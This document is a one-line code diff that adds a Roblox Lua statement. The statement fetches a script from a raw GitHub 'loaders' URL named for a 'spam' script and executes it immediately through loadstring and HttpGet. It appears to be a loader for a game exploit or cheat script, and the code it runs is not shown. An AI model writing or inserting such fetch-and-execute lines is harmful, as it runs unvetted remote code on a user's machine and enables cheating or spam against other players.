@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Unitetrumake/loaders/main/loaders/huss-valley-spam4-f1dkum19gvu6ve.lua"))()
